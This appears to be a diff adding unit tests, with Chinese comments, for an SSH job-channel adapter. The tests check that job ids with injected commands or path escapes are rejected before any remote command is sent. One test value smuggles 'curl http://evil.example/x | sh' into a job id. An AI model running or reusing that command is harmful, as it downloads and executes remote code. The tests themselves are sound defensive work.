@@ -112,6 +112,37 @@ describe('章十二：ssh 通道适配器（cloud-exec）', () => {
     const channel = createSshTrainChannel({ endpoint: 'user@vm1', exec });
     await expect(channel.status('job-1')).rejects.toThrow('ETIMEDOUT');
   });
+
+  it('P2-4：恶意 remoteJobId 不入远端命令串（四动作共用一处守卫）', async () => {
+    const evil = 'job-1; curl http://evil.example/x | sh';
+    const exec = makeFakeExec([() => ({ stdout: '', stderr: '' })]);
+    const channel = createSshTrainChannel({ endpoint: 'user@vm1', exec });
+    await expect(channel.status(evil)).rejects.toThrow(/remoteJobId 非法/);
+    await expect(channel.artifacts(evil)).rejects.toThrow(/remoteJobId 非法/);
+    await expect(channel.cancel(evil, '止损')).rejects.toThrow(/remoteJobId 非法/);
+    await expect(
+      channel.submit('/local/job-1', { jobId: evil, jobJsonSha256: 'a'.repeat(64) }),
+    ).rejects.toThrow(/remoteJobId 非法/);
+    // 🔴 关键断言：拒绝发生在拼命令之前——零命令下发（否则恶意串已进远端 shell）
+    expect(exec.calls).toHaveLength(0);
+  });
+
+  it('P2-4：路径逃逸型 id 同样被拦（../ 与分隔符 / 空字节）', async () => {
+    const exec = makeFakeExec([() => ({ stdout: '', stderr: '' })]);
+    const channel = createSshTrainChannel({ endpoint: 'user@vm1', exec });
+    for (const bad of ['../etc', 'a/b', 'a\\b', 'a\0b']) {
+      await expect(channel.status(bad)).rejects.toThrow(/remoteJobId 非法/);
+    }
+    expect(exec.calls).toHaveLength(0);
+  });
+
+  it('P2-4：合法 id 不受影响（守卫不误伤）', async () => {
+    const exec = makeFakeExec([() => ({ stdout: '{}', stderr: '' })]);
+    const channel = createSshTrainChannel({ endpoint: 'user@vm1', exec });
+    const st = await channel.status('cloud-9_a.b');
+    expect(st.status).toBe('pending');
+    expect(exec.calls).toHaveLength(1);
+  });
 });
 
 describe('章十二：双通道事件归一（cloud-events）', () => {
